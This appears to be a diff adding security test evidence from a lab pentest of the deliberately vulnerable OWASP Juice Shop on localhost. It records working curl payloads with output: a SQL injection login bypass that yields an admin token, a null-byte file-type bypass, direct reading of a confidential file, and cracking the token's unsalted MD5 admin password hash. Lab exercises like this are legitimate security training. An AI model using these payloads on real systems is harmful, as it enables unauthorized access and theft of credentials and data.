@@ -1,0 +1,36 @@
+### VL-01 SQL injection auth bypass
+$ curl -X POST http://localhost:3002/rest/user/login -d '{"email":"'\'' OR 1=1--","password":"x"}'
+{
+    "authentication": {
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMTEtMTcgMjI6MzI6NDQuNzYyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMTEtMTcgMjI6MzI6NDQuNzYyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc5NDk1NDkxNX0.EHdz5xGsazJt_pnyLYZaTO_0T1RDWYpmpV_pwoQbRkjLD8DLHGVSjSD6P5-Tmq69aVPfbOhsv6rs3j9CF2dsI4R2NvQ0lABfkSiGolUO-pLv-Egh88amFzXl9qbrfimiwFDrHhdvzTpAMpT3lWtA_9wVcunOfSTsKL9-rFrQcT8",
+        "bid": 1,
+        "umail": "admin@juice-sh.op"
+    }
+}
+
+### VL-05 /ftp null-byte bypass -> serves package.json.bak (not an allowed .md/.pdf)
+$ curl 'http://localhost:3002/ftp/package.json.bak%2500.md'
+{
+  "name": "juice-shop",
+  "version": "6.2.0-SNAPSHOT",
+  "description": "An intentionally insecure JavaScript Web Application",
+  "homepage": "http://owasp-juice.shop",
+  "author": "Björn Kimminich <bjoern.kimminich@owasp.org> (https://kimminich.de)",
+  "contributors": [
+    "Björn Kimminich",
+   ...
+
+### VL-05 (b) confidential doc directly readable
+$ curl http://localhost:3002/ftp/acquisitions.md
+# Planned Acquisitions
+
+> This document is confidential! Do not distribute!
+
+Our company plans to acquire several competitors within the next year.
+This will have a significant stock market impact as we will elaborate in
+
+### VL-06 login JWT leaks unsalted MD5 password hash
+$ decode data.password from login token for admin@juice-sh.op
+stored password hash : 0192023a7bbd73250516f069df18b500
+md5("admin123")       : 0192023a7bbd73250516f069df18b500
+match                : True
